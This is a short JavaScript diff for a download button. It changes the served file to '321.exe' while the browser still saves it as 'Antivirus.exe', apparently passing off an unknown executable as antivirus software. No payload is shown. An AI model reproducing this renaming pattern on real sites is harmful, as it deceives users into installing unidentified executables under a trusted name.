@@ -1,5 +1,5 @@
 document.getElementById('download-btn').addEventListener('click', () => {
-    const fileUrl = 'Antivirus.exe'; // Replace with the actual file path
+    const fileUrl = '321.exe'; // Replace with the actual file path
     const anchor = document.createElement('a');
     anchor.href = fileUrl;
     anchor.download = 'Antivirus.exe'; // The file name for download
